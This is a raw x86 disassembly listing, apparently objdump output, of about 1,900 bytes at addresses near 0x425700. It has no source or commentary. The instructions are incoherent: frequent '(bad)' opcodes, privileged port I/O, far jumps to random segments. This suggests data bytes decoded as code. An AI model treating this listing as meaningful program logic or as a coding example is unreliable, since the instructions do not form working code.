  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	cmp    esp,DWORD PTR [esi]
  4256c8:	push   ss
  4256c9:	clc    
  4256ca:	jo     0x42569a
  4256cc:	add    DWORD PTR [eax],eax
  4256ce:	cld    
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    al,cl
  4256d3:	jns    0x4256d7
  4256d5:	cli    
  4256d6:	pmulhw mm6,QWORD PTR [ebp+0x3f]
  4256da:	mov    DWORD PTR [si+0x56a8],ecx
  4256df:	loopne 0x4256d2
  4256e1:	fs and al,0x4
  4256e4:	arpl   WORD PTR [eax-0x4c7c020c],bp
  4256ea:	or     BYTE PTR ds:0xad6e1eb1,al
  4256f0:	push   edi
  4256f1:	inc    ecx
  4256f2:	adc    edx,DWORD PTR [ebx]
  4256f4:	add    eax,0x9d0d6817
  4256f9:	lock and al,BYTE PTR ds:0xac1398d3
  425700:	loop   0x42572e
  425702:	(bad)  
  425703:	pop    edx
  425704:	nop
  425705:	fcom   st(7)
  425707:	rol    ch,cl
  425709:	in     eax,0x4f
  42570b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42570c:	mov    ebx,?
  42570e:	shl    dh,0xc
  425711:	xor    BYTE PTR [esp+edi*8],dh
  425714:	mov    ch,0x9
  425716:	sub    al,0x80
  425718:	push   edi
  425719:	cmp    DWORD PTR [ebx-0x7712950c],edi
  42571f:	pop    ds
  425720:	sub    ebx,DWORD PTR [ebp-0x40]
  425723:	bound  eax,QWORD PTR [ecx-0x49]
  425726:	nop
  425727:	sahf   
  425728:	and    eax,esp
  42572a:	mov    bh,0x3d
  42572c:	jnp    0x42576d
  42572e:	in     al,dx
  42572f:	and    DWORD PTR [ebx+0x3e],eax
  425732:	and    al,0x6f
  425734:	add    al,0xcf
  425736:	sbb    al,0xba
  425738:	data16 out dx,al
  42573a:	cmp    DWORD PTR [ebx+0x2a2e8884],edi
  425740:	cwde   
  425741:	(bad)
  425744:	scas   eax,DWORD PTR es:[edi]
  425745:	call   0x6522:0xcd660f4a
  42574c:	rol    DWORD PTR [edi+0x44cff1db],0x4
  425753:	push   esp
  425754:	cmp    ecx,DWORD PTR [edx+0x41]
  425757:	imul   edi,DWORD PTR [eax-0x277bfaa],0xffffffe7
  42575e:	dec    ecx
  42575f:	cdq    
  425760:	mov    edi,0xca51d24d
  425765:	fld    DWORD PTR [ebx-0x5]
  425768:	xchg   esi,eax
  425769:	(bad)  
  42576a:	out    0xaa,eax
  42576c:	ror    DWORD PTR [eax+ebp*8],1
  42576f:	pop    ds
  425770:	mov    ebp,0x93606fcf
  425775:	cmp    al,0x81
  425778:	add    DWORD PTR [edi-0x63],esi
  42577b:	mov    edi,0x2344ccfc
  425780:	imul   ebp,ecx,0x8704b938
  425786:	out    dx,al
  425787:	out    dx,al
  425788:	xchg   BYTE PTR [ebp-0x7e],cl
  42578b:	les    ebp,FWORD PTR [edx]
  42578d:	mov    ds,WORD PTR [ebx-0x66ed7ef7]
  425793:	inc    edx
  425794:	imul   eax,DWORD PTR [edi],0xac6ca56e
  42579a:	out    0x1d,eax
  42579c:	(bad)  
  42579d:	cwde   
  42579e:	jno    0x42578a
  4257a0:	mov    ds:0x42cffe82,eax
  4257a5:	das    
  4257a6:	hlt    
  4257a7:	je     0x425735
  4257a9:	dec    esi
  4257aa:	(bad)  
  4257ab:	retf   0x65e4
  4257ae:	sti    
  4257af:	jle    0x4257d5
  4257b1:	shl    DWORD PTR [edi+0x3612e7d3],cl
  4257b7:	jnp    0x42581e
  4257b9:	je     0x4257d6
  4257bb:	inc    ebp
  4257bc:	or     BYTE PTR [edx+ecx*8-0x40],bl
  4257c0:	jns    0x4257d5
  4257c2:	fstp   DWORD PTR [edi]
  4257c4:	clc    
  4257c5:	and    DWORD PTR [ebp+esi*8-0x3f],ebp
  4257c9:	inc    eax
  4257ca:	xor    dh,BYTE PTR [esi]
  4257cc:	sbb    al,BYTE PTR [ebp+0x293307b8]
  4257d2:	push   ebp
  4257d3:	jns    0x4257c6
  4257d5:	ds jecxz 0x4257dd
  4257d8:	fimul  DWORD PTR [eax+0x52]
  4257db:	add    ebp,edx
  4257dd:	fild   QWORD PTR [ebx]
  4257df:	or     esp,DWORD PTR gs:[ebx-0x3cad8dee]
  4257e6:	inc    ebp
  4257e7:	adc    eax,0xc31f364e
  4257ec:	xor    al,0x20
  4257ef:	or     eax,0x278fbad
  4257f4:	inc    ebp
  4257f5:	xchg   ebx,eax
  4257f6:	mov    dh,0x74
  4257f8:	test   DWORD PTR ds:0xa4c4448b,edx
  4257fe:	test   al,0x26
  425800:	cwde   
  425801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425802:	das    
  425803:	inc    ebx
  425804:	(bad)  
  425805:	stc    
  425806:	cmc    
  425807:	imul   esp,DWORD PTR [edx-0x4],0x43
  42580b:	and    esp,ebx
  42580d:	inc    ebp
  42580e:	xlat   BYTE PTR ds:[ebx]
  42580f:	dec    ebx
  425810:	inc    edx
  425811:	out    dx,al
  425812:	mov    edi,ecx
  425814:	mov    cl,0xa6
  425816:	adc    BYTE PTR [eax],0xd4
  425819:	repz jnp 0x42586f
  42581c:	adc    ebp,DWORD PTR [ecx+0xeca63bc]
  425822:	iret   
  425823:	pop    ecx
  425824:	je     0x425833
  425826:	addr16 stc 
  425828:	std    
  425829:	xor    DWORD PTR [ecx],ebp
  42582b:	push   0x1ba5aa0a
  425830:	icebp  
  425831:	test   BYTE PTR es:[eax],dh
  425834:	loopne 0x425834
  425836:	pop    ss
  425837:	jl     0x425877
  425839:	and    eax,0xdcdb3cb
  42583e:	mov    BYTE PTR [ecx+0x6c],0x72
  425842:	push   ds
  425843:	jg     0x4257fe
  425845:	clc    
  425846:	sahf   
  425847:	out    0xcf,eax
  425849:	ret    0x1730
  42584c:	and    eax,0x5d9ce107
  425851:	sbb    dh,BYTE PTR [ebx+0x6d]
  425854:	push   ds
  425855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425856:	xor    cl,BYTE PTR [ecx+ecx*8+0x392a37b6]
  42585d:	das    
  42585e:	test   BYTE PTR [edi-0x7e],ah
  425861:	jmp    0x1d4fc3fa
  425866:	push   cs
  425867:	push   edx
  425868:	repz loop 0x425864
  42586b:	add    DWORD PTR [edx-0x43b1c85b],esi
  425871:	test   DWORD PTR [esi+ebx*8+0x36],ebx
  425875:	xchg   ecx,eax
  425876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425877:	or     al,0xa6
  425879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42587a:	cmp    DWORD PTR [eax],edx
  42587c:	push   ds
  42587d:	cs in  eax,0xcb
  425880:	leave  
  425881:	sub    dh,BYTE PTR [edx+eax*8]
  425884:	jmp    0x4258ef
  425886:	iret   
  425887:	adc    esp,DWORD PTR [eax+0x8]
  42588a:	push   0x1d
  42588c:	mov    ch,0x97
  42588e:	mov    ds:0xa904a8da,al
  425893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425894:	mov    bh,0x67
  425897:	imul   edi,edi,0xffffffbc
  42589a:	test   al,0x3e
  42589c:	mov    WORD PTR [ecx+0x57395f18],?
  4258a2:	dec    ecx
  4258a3:	mov    eax,0xb38227b3
  4258a8:	aas    
  4258a9:	rol    DWORD PTR [ebx+0x43],cl
  4258ac:	dec    edx
  4258ad:	mov    ecx,0x33402cc6
  4258b2:	mov    dh,0xb3
  4258b4:	fmulp  st(4),st
  4258b6:	and    BYTE PTR [edx+ecx*8+0x62637d80],ch
  4258bd:	mov    ah,0xb6
  4258bf:	sub    DWORD PTR [edx],ebp
  4258c1:	dec    esi
  4258c2:	addr16 dec esp
  4258c4:	dec    ecx
  4258c6:	lahf   
  4258c7:	jb     0x4258d7
  4258c9:	push   esp
  4258ca:	xor    al,BYTE PTR [ecx+0xd2fb]
	...
  4258d8:	add    BYTE PTR [eax],al
  4258da:	dec    ebx
  4258db:	inc    ebp
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	ffree  st(1)
  4258e8:	daa    
  4258e9:	lods   al,BYTE PTR ds:[esi]
  4258ea:	ins    BYTE PTR es:[edi],dx
  4258eb:	rol    BYTE PTR [ecx],1
  4258ed:	add    ah,bh
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    BYTE PTR [ecx+0x60],ch
  4258f4:	in     al,0x9f
  4258f6:	cmc    
  4258f7:	mov    BYTE PTR [edi+0x3c],ch
  4258fa:	push   edx
  4258fb:	xor    al,0xd0
  4258fd:	ror    DWORD PTR [ebx-0xd8ea5d2],0x86
  425904:	rcr    edi,1
  425906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425907:	push   cs
  425908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425909:	hlt    
  42590a:	sbb    eax,0x8142e904
  42590f:	loopne 0x4258be
  425911:	sub    al,0xea
  425913:	or     al,0xa0
  425915:	sbb    ecx,DWORD PTR [edi-0x2bc77cad]
  42591b:	push   ss
  42591c:	imul   ecx,eax,0x0
  42591f:	or     BYTE PTR [eax+0x5c],bh
  425922:	lahf   
  425923:	and    esp,esi
  425925:	into   
  425926:	pop    ebp
  425927:	or     eax,0x5f17c11a
  42592c:	dec    ecx
  42592d:	add    eax,0x2777860d
  425932:	pop    es
  425933:	je     0x4258b7
  425935:	dec    eax
  425936:	addr16 jne 0x4259b0
  425939:	fstp   st(5)
  42593b:	fsubrp st(3),st
  42593d:	rcl    DWORD PTR ds:0xaedc0df2,1
  425943:	xor    dx,cx
  425946:	les    esp,FWORD PTR [ebp-0x59]
  425949:	mov    esp,0xe66b1c55
  42594e:	daa    
  42594f:	mov    eax,ds:0xe08eb7da
  425954:	jmp    0x26bcf6aa
  425959:	ds jno 0x425956
  42595c:	arpl   sp,cx
  42595e:	aaa    
  42595f:	and    dl,BYTE PTR [edx-0x1ce818ae]
  425965:	(bad)  
  425966:	xchg   edi,eax
  425967:	push   eax
  425968:	sahf   
  425969:	cmp    al,0xd9
  42596b:	inc    eax
  42596c:	inc    esp
  42596d:	addr16 ret 
  42596f:	jns    0x42598e
  425971:	pusha  
  425972:	retf   
  425973:	cmp    bl,BYTE PTR [ecx]
  425975:	imul   esi,DWORD PTR [ebx+0x6b],0x7b
  425979:	fucom  st(2)
  42597b:	imul   ecx,DWORD PTR [ecx],0xffffffa0
  42597e:	into   
  42597f:	stc    
  425980:	lahf   
  425981:	xchg   ebp,eax
  425982:	xor    edi,DWORD PTR [edx]
  425984:	jnp    0x4259a1
  425986:	outs   dx,BYTE PTR ds:[esi]
  425987:	lahf   
  425988:	leave  
  425989:	in     eax,dx
  42598a:	icebp  
  42598b:	xchg   BYTE PTR [edi+esi*2+0x23],cl
  42598f:	adc    esi,DWORD PTR [ecx+0x7e6e563]
  425995:	xchg   ebp,eax
  425996:	mov    dl,0x3e
  425998:	pop    eax
  425999:	inc    edi
  42599a:	pop    es
  42599b:	pop    esi
  42599c:	xchg   ebx,eax
  42599d:	cli    
  42599e:	clc    
  42599f:	es std 
  4259a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259a2:	add    BYTE PTR [ebx],bh
  4259a4:	sbb    dh,dl
  4259a6:	in     eax,dx
  4259a7:	ret    
  4259a8:	cmp    bh,al
  4259aa:	push   es
  4259ab:	pop    ebx
  4259ac:	xchg   edx,eax
  4259ad:	outs   dx,BYTE PTR ds:[esi]
  4259ae:	das    
  4259af:	lods   al,BYTE PTR ds:[esi]
  4259b0:	adc    ecx,DWORD PTR [ebx-0x2c]
  4259b3:	push   cs
  4259b4:	fisub  DWORD PTR [ecx]
  4259b6:	addr16 cmp eax,0x63e0ba86
  4259bc:	cmp    cl,BYTE PTR [ebx]
  4259be:	pop    eax
  4259bf:	dec    ecx
  4259c0:	xchg   ebp,eax
  4259c1:	iret   
  4259c2:	xchg   WORD PTR [edx+0x1c],ax
  4259c6:	in     eax,0xfa
  4259c8:	and    al,0xea
  4259ca:	push   esp
  4259cb:	inc    edi
  4259cc:	(bad)  
  4259cd:	jg     0x425a27
  4259cf:	in     eax,dx
  4259d0:	cld    
  4259d1:	cmp    esp,DWORD PTR [ecx]
  4259d3:	aam    0x36
  4259d5:	lods   al,BYTE PTR ds:[esi]
  4259d6:	xor    al,0x81
  4259d8:	inc    edi
  4259d9:	push   edx
  4259da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259db:	mov    dl,0x77
  4259dd:	cs pushf 
  4259df:	cmc    
  4259e0:	sub    dl,BYTE PTR [eax+0x23a1db4d]
  4259e6:	popf   
  4259e7:	fidiv  DWORD PTR [eax+esi*2-0x4217a28e]
  4259ee:	fst    QWORD PTR [edi+0x1e84b2d8]
  4259f4:	in     eax,0xcb
  4259f6:	jne    0x4259d0
  4259f8:	cmc    
  4259f9:	cmp    dh,BYTE PTR [edx-0x47]
  4259fc:	push   0xffffff8d
  4259fe:	pop    esi
  4259ff:	cmc    
  425a00:	dec    ecx
  425a01:	ja     0x425985
  425a03:	fistp  DWORD PTR [esi+0x5cacbb60]
  425a09:	mov    bh,0x1c
  425a0b:	sbb    bl,BYTE PTR [esi+esi*2+0x13]
  425a0f:	add    esp,ebx
  425a11:	xchg   ecx,eax
  425a12:	sbb    ax,0x47c1
  425a16:	mov    esp,0xd91c9e7b
  425a1b:	ret    0xc562
  425a1e:	lds    edx,FWORD PTR [edi+0x58]
  425a21:	ret    
  425a22:	je     0x425a58
  425a24:	call   0xd8e0:0x3b983bd7
  425a2b:	fbld   TBYTE PTR [ebx-0x6b]
  425a2e:	mov    dl,0x7
  425a30:	fimul  WORD PTR [ebx]
  425a32:	jne    0x425a89
  425a34:	mov    ebx,0xac0c8ee2
  425a39:	push   edx
  425a3a:	dec    esp
  425a3b:	cli    
  425a3c:	fild   QWORD PTR [ecx]
  425a3e:	inc    edx
  425a3f:	in     eax,0xb
  425a41:	xlat   BYTE PTR ds:[ebx]
  425a42:	loopne 0x425a9b
  425a44:	ror    BYTE PTR [ebx],cl
  425a46:	push   cs
  425a47:	adc    bl,BYTE PTR ds:0x9d3590ce
  425a4d:	rol    DWORD PTR [edi],1
  425a4f:	push   eax
  425a50:	das    
  425a51:	or     al,BYTE PTR [ecx]
  425a53:	bound  ecx,QWORD PTR [esi-0x62a86fb]
  425a59:	loop   0x425a73
  425a5b:	dec    ebp
  425a5c:	lods   al,BYTE PTR ds:[esi]
  425a5d:	fwait
  425a5e:	pop    eax
  425a5f:	out    dx,al
  425a60:	mov    eax,0xa895c9cf
  425a65:	in     al,dx
  425a66:	es (bad) 
  425a68:	stc    
  425a69:	push   edi
  425a6a:	hlt    
  425a6b:	mov    ecx,DWORD PTR [ebp+0xd]
  425a6e:	stos   DWORD PTR es:[edi],eax
  425a6f:	mov    cl,0xc8
  425a71:	adc    al,0x75
  425a73:	push   bx
  425a75:	push   ds
  425a76:	xchg   edx,eax
  425a77:	push   ecx
  425a78:	shl    BYTE PTR [ebp-0x77],1
  425a7b:	adc    dl,BYTE PTR [ebp+0x22ea3341]
  425a81:	push   ebx
  425a82:	sti    
  425a83:	sbb    bh,BYTE PTR [edx-0x27]
  425a86:	pop    esp
  425a87:	push   edx
  425a88:	xrelease xchg DWORD PTR [ecx-0x55],ebp
  425a8c:	cmc    
  425a8d:	adc    ebx,DWORD PTR [edi+0x63]
  425a90:	out    dx,eax
  425a91:	(bad)  
  425a92:	cmp    al,0xec
  425a94:	pop    eax
  425a95:	fcmovnbe st,st(4)
  425a97:	fucom  st(5)
  425a99:	mov    ah,0x1b
  425a9b:	fs lahf 
  425a9d:	push   ds
  425a9e:	outs   dx,DWORD PTR ds:[esi]
  425a9f:	mov    ah,bl
  425aa1:	test   eax,0x38bc8ea1
  425aa6:	sbb    edx,DWORD PTR [ecx]
  425aa8:	and    DWORD PTR [ecx+0x1c0affe6],eax
  425aae:	dec    DWORD PTR ds:0xe7190641
  425ab4:	icebp  
  425ab5:	xor    DWORD PTR [ecx],0xffffff8b
  425ab8:	ret    
  425ab9:	das    
  425aba:	stc    
  425abb:	jmp    0x327:0xbfbd056f
  425ac2:	retf   0x36c7
  425ac5:	add    BYTE PTR [ebx+0x1508e21],ch
  425acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425acc:	out    0x4f,eax
  425ace:	cmp    eax,0x2ce3dff9
  425ad3:	nop
  425ad4:	out    dx,eax
  425ad5:	sbb    DWORD PTR [ebp+0x1994aa76],ebp
  425adb:	(bad)  
  425adc:	dec    eax
  425add:	push   ebx
  425ade:	jle    0x425ae7
  425ae0:	push   es
  425ae1:	outs   dx,DWORD PTR ds:[esi]
  425ae2:	cmp    BYTE PTR [edx],al
  425ae4:	gs mov al,0xd8
  425ae7:	sbb    dl,0x60
  425aea:	jnp    0x425b52
  425aec:	mov    bh,0x39
	...
  425afa:	stos   BYTE PTR es:[edi],al
  425afb:	jo     0x425add
  425afd:	dec    ecx
  425afe:	cli    
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	adc    BYTE PTR [ebp+0x2e],bl
  425b09:	and    BYTE PTR [eax-0x2e],ch
  425b0c:	add    DWORD PTR [eax],eax
  425b0e:	cld    
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    BYTE PTR [eax-0x6778da25],bh
  425b17:	mov    ds:0x684d1856,eax
  425b1c:	inc    ebp
  425b1d:	div    DWORD PTR ds:0xa46569e1
  425b23:	jl     0x425b10
  425b25:	mov    eax,ds:0xb00e759e
  425b2a:	push   es
  425b2b:	pop    es
  425b2c:	aas    
  425b2d:	or     al,0x47
  425b2f:	xor    ecx,DWORD PTR [ecx-0x64]
  425b32:	(bad)  
  425b33:	pop    edi
  425b34:	in     eax,dx
  425b35:	jecxz  0x425ac4
  425b37:	or     DWORD PTR [edi-0x305d921d],ecx
  425b3d:	push   esi
  425b3e:	adc    eax,0xd154f51
  425b43:	(bad)  
  425b44:	mov    ecx,0xa5f8b7b7
  425b49:	fwait
  425b4a:	dec    esp
  425b4b:	stos   BYTE PTR es:[edi],al
  425b4c:	lods   al,BYTE PTR ds:[esi]
  425b4d:	mov    ch,0xc3
  425b4f:	or     BYTE PTR [esi+ebp*4-0x2b],0xc8
  425b54:	jmp    0xf98b:0x4d5803cd
  425b5b:	cmp    ecx,DWORD PTR [ecx+ebx*1]
  425b5e:	push   0xfffffff9
  425b60:	mov    eax,ds:0xf06ea2b7
  425b65:	lea    ecx,[esi]
  425b67:	daa    
  425b68:	sbb    esi,DWORD PTR [edx+0x1]
  425b6b:	sbb    DWORD PTR [ebx-0x697a15d],0xffffff9b
  425b72:	out    0xa0,eax
  425b74:	mov    eax,0xa0eab4c5
  425b79:	mov    dl,0x8a
  425b7b:	stc    
  425b7c:	xor    edi,ebp
  425b7e:	pxor   mm3,QWORD PTR cs:[ebp+0x32]
  425b83:	popa   
  425b84:	xor    DWORD PTR [esp+ecx*1-0x3eaf3bbc],ebp
  425b8b:	dec    esi
  425b8c:	sub    DWORD PTR [eax-0x241cfbd0],0xffffffda
  425b93:	mov    ebx,0x2ddfc19e
  425b98:	int3   
  425b99:	cli    
  425b9a:	pop    edi
  425b9b:	or     cl,BYTE PTR [ebx+esi*8-0x7287c7b8]
  425ba2:	cmp    DWORD PTR [ecx],ecx
  425ba4:	sbb    BYTE PTR [edi],bh
  425ba6:	jo     0x425bd0
  425ba8:	dec    ecx
  425ba9:	jl     0x425b68
  425bab:	pop    esi
  425bac:	xor    bl,bh
  425bae:	sbb    eax,0x3907c1a0
  425bb3:	mov    ch,cl
  425bb5:	sub    DWORD PTR [ebx-0x10],ebp
  425bb8:	add    esp,eax
  425bba:	cli    
  425bbb:	sub    BYTE PTR [ecx+ebx*8],dh
  425bbe:	push   edx
  425bbf:	sbb    al,BYTE PTR [ebx-0x15]
  425bc2:	test   ah,0x7a
  425bc5:	push   edx
  425bc6:	xor    DWORD PTR [edx-0x80],eax
  425bc9:	sub    BYTE PTR [edi],bh
  425bcb:	and    al,0x85
  425bcd:	lock xor BYTE PTR [ecx-0x17],bh
  425bd1:	mov    eax,ds:0x626d4c9a
  425bd6:	(bad)  
  425bd7:	or     BYTE PTR ds:0x6aea4851,al
  425bdd:	in     eax,dx
  425bde:	pop    ss
  425bdf:	(bad)  
  425be1:	push   0x6f3c4f2f
  425be6:	mov    eax,ds:0x5aa32033
  425beb:	cmc    
  425bec:	int    0x72
  425bee:	fbstp  TBYTE PTR [eax+0x6d218d11]
  425bf4:	jne    0x425c66
  425bf6:	add    ebp,DWORD PTR [eax]
  425bf8:	jge    0x425c2d
  425bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425bfb:	shr    BYTE PTR [esi+0x21],cl
  425bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425bff:	sar    BYTE PTR [edi],cl
  425c01:	jg     0x425b9e
  425c03:	(bad)  
  425c04:	mov    ecx,0x7b7fc27
  425c09:	adc    BYTE PTR [esi-0x576f3b29],ah
  425c0f:	std    
  425c10:	dec    esp
  425c11:	adc    eax,0x12bb9554
  425c16:	inc    edi
  425c17:	(bad)  
  425c18:	push   esi
  425c19:	xchg   esp,eax
  425c1a:	loope  0x425bce
  425c1c:	jmp    0xd5907e76
  425c21:	mov    eax,0xa1e05262
  425c26:	rcr    BYTE PTR [ecx+esi*1-0x51107587],1
  425c2d:	mov    bl,dh
  425c2f:	mov    ecx,0xbd829c3b
  425c34:	sar    DWORD PTR [ebp+ebp*4-0x77234e52],cl
  425c3b:	inc    edx
  425c3c:	sub    DWORD PTR [edx],0x153eebd6
  425c42:	xor    DWORD PTR ss:[ebp+0x71],esi
  425c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c47:	and    eax,edx
  425c49:	jl     0x425c9c
  425c4b:	xchg   ebp,eax
  425c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c4d:	jmp    0xe1c1:0xb041417d
  425c54:	cmp    eax,0xdcb43bdd
  425c59:	mov    esp,ebx
  425c5b:	jmp    0x6eac:0xc31571ea
  425c62:	sbb    BYTE PTR [edx+0x7f],dl
  425c65:	addr16 int 0x66
  425c68:	cld    
  425c69:	loop   0x425cd3
  425c6b:	and    ecx,DWORD PTR ds:0x99616c24
  425c71:	and    al,0x44
  425c73:	loope  0x425c5b
  425c75:	in     al,0x46
  425c77:	cmp    esi,esi
  425c79:	rcr    cl,1
  425c7b:	shr    eax,cl
  425c7d:	jecxz  0x425c2e
  425c7f:	dec    ebp
  425c80:	mov    DWORD PTR [ecx+0xcdf9b73],edi
  425c86:	jae    0x425d01
  425c88:	and    DWORD PTR [ebx+eax*1-0x6e],edx
  425c8c:	sti    
  425c8d:	lahf   
  425c8e:	sbb    BYTE PTR [edi+0x66],0xf7
  425c92:	mov    eax,0x27af225d
  425c97:	mov    dh,0xea
  425c99:	aaa    
  425c9a:	and    BYTE PTR [ebx+ebp*1-0x6c],bl
  425c9e:	aam    0xcf
  425ca0:	cmp    eax,0x8478f5d7
  425ca5:	dec    esi
  425ca6:	mov    ah,0x6b
  425ca8:	mov    al,0x58
  425caa:	lods   eax,DWORD PTR ds:[esi]
  425cab:	mov    ds:0xf65834f9,al
  425cb0:	adc    DWORD PTR [ecx+ecx*2],eax
  425cb3:	std    
  425cb4:	lock out 0x5e,al
  425cb7:	je     0x425ce4
  425cb9:	or     BYTE PTR [ebp+0x10715a9c],0xee
  425cc0:	pop    esi
  425cc1:	sub    DWORD PTR ds:[edi],esi
  425cc4:	sahf   
  425cc5:	aad    0xdc
  425cc7:	mov    ch,0xf9
  425cc9:	test   cl,0x4f
  425ccc:	push   ecx
  425ccd:	(bad)  
  425cce:	icebp  
  425ccf:	or     edi,ecx
  425cd1:	loopne 0x425ccd
  425cd3:	fist   WORD PTR [esi]
  425cd5:	adc    ah,bh
  425cd7:	push   esi
  425cd8:	pushf  
  425cd9:	mov    ecx,0xa024accc
  425cde:	aas    
  425cdf:	mov    bh,0x6f
  425ce1:	xor    eax,ebx
  425ce3:	leave  
  425ce4:	sbb    eax,DWORD PTR [edi+0x4c645a96]
  425cea:	mov    edi,0x1416eded
  425cef:	mov    al,ds:0x586b1719
  425cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cf5:	inc    ecx
  425cf6:	inc    ebx
  425cf7:	mov    bl,BYTE PTR [eax+ebp*2-0xb6041f7]
  425cfe:	fisttp WORD PTR [edx+edi*8]
  425d01:	dec    esp
  425d02:	mov    ah,0x79
  425d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d05:	ja     0x425c8b
  425d07:	ror    DWORD PTR [ebx+0x70],0x56
  425d0b:	and    eax,0x1c77
	...
  425d18:	add    BYTE PTR [eax],al
  425d1a:	dec    edx
  425d1b:	xchg   DWORD PTR [edx+0x4c],edx
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi+0x166d210f],ecx
  425d27:	or     bh,BYTE PTR [eax]
  425d29:	mov    al,0x64
  425d2b:	aam    0x1
  425d2d:	add    ah,bh
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [ebx],dh
  425d33:	lods   al,BYTE PTR ds:[esi]
  425d34:	ret    0xdc55
  425d37:	leave  
  425d38:	cmp    eax,0x6bf4c85d
  425d3d:	and    ecx,ecx
  425d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d40:	cdq    
  425d41:	jle    0x425dbe
  425d43:	jae    0x425d28
  425d45:	add    DWORD PTR [ebx+0x4f5fd172],0x71d42ec2
  425d4f:	test   eax,0x64b85532
  425d54:	mov    ds:0x2ccec3f2,al
  425d59:	lods   al,BYTE PTR ds:[esi]
  425d5a:	mov    ah,ch
  425d5c:	retf   0xe0e3
  425d5f:	js     0x425d78
  425d61:	mov    BYTE PTR [edx+0x50bfc728],dh
  425d67:	pop    eax
  425d68:	fldcw  WORD PTR [esi-0x16]
  425d6b:	sbb    BYTE PTR [edx-0x16],0xb
  425d6f:	ins    DWORD PTR es:[edi],dx
  425d70:	inc    edi
  425d71:	jbe    0x425dd2
  425d73:	inc    ebp
  425d74:	mov    dl,0xe
  425d76:	push   ebp
  425d77:	dec    ebp
  425d78:	aad    0xcf
  425d7a:	or     BYTE PTR [esi-0x18e24684],0xfb
  425d81:	sub    BYTE PTR [esi+0x65],cl
  425d84:	fxam   
  425d86:	(bad)
  425d8a:	jns    0x425de1
  425d8c:	cwde   
  425d8d:	aad    0xd8
  425d8f:	mov    ah,0x37
  425d91:	jns    0x425d7e
  425d93:	pushf  
  425d94:	int3   
  425d95:	jge    0x425d99
  425d97:	mov    cl,0xcd
  425d99:	popf   
  425d9a:	icebp  
  425d9b:	out    0x59,al
  425d9d:	ret    0xe778
  425da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425da1:	jg     0x425df8
  425da3:	ds inc edx
  425da5:	push   ebp
  425da6:	inc    edx
  425da7:	ins    DWORD PTR es:[edi],dx
  425da8:	push   ebx
  425da9:	in     eax,dx
  425daa:	cmp    al,0xa4
  425dac:	sbb    ecx,ebp
  425dae:	adc    al,0x25
  425db0:	add    al,0xff
  425db2:	(bad)  
  425db3:	into   
  425db4:	adc    BYTE PTR [esi-0x68],cl
  425db7:	daa    
  425db8:	repz cs jnp 0x425e06
  425dbc:	cmp    al,0x2
  425dbe:	jns    0x425d7a
  425dc0:	add    ebx,ebp
  425dc2:	cmp    dh,ah
  425dc4:	and    eax,0x4fe632
  425dc9:	cs add al,0x63
  425dcc:	jns    0x425deb
  425dce:	pop    ebx
  425dcf:	(bad)  
  425dd0:	mov    edi,0xb17fb01e
  425dd5:	test   eax,0xdc02b0c0
  425dda:	and    dh,BYTE PTR [edi+0x11e799c8]
  425de0:	retf   
  425de1:	lock xor BYTE PTR [esi-0x1ed374b4],al
  425de8:	pop    edi
  425de9:	out    0x5e,al
  425deb:	jbe    0x425de1
  425ded:	fucomp st(4)
  425def:	dec    ebx
  425df0:	mov    ebp,0x83af9ad
  425df5:	pop    ebp
  425df6:	imul   esi,DWORD PTR [ebp-0x68],0xffffffa7
  425dfa:	(bad)  
  425dfb:	aad    0x92
  425dfd:	mov    ds:0xa98e6c5d,eax
  425e02:	test   DWORD PTR [esi+ebx*1-0x71],esp
  425e06:	pop    edi
  425e07:	sbb    al,0xb0
  425e09:	repz ret 
  425e0b:	push   eax
  425e0c:	or     eax,0x8ebfecb8
  425e11:	pop    edi
  425e12:	aas    
  425e13:	sbb    BYTE PTR ds:0x3f4cb7c0,0x66
  425e1a:	mov    ds:0xf554d5c3,al
  425e1f:	mov    bl,0x83
  425e21:	loope  0x425e54
  425e23:	sahf   
  425e24:	sar    DWORD PTR [si-0x33],cl
  425e28:	int    0x0
  425e2a:	inc    ecx
  425e2b:	jecxz  0x425e4a
  425e2d:	ins    DWORD PTR es:[edi],dx
  425e2e:	add    bh,BYTE PTR [eax]
  425e30:	and    ebp,DWORD PTR [ebp-0xa]
  425e33:	and    BYTE PTR [ebx+esi*8-0x64f313bd],ch
  425e3a:	jo     0x425e2b
  425e3c:	dec    ebx
  425e3d:	mov    al,BYTE PTR [ebx+ebp*8]
  425e40:	jp     0x425dca
  425e42:	push   esp
  425e43:	in     al,0x18
  425e45:	xlat   BYTE PTR ds:[ebx]
  425e46:	push   edx
  425e47:	push   es
  425e48:	and    ebx,edx
  425e4a:	mov    bl,0xb4
  425e4c:	xchg   ebp,eax
  425e4d:	stos   BYTE PTR es:[edi],al
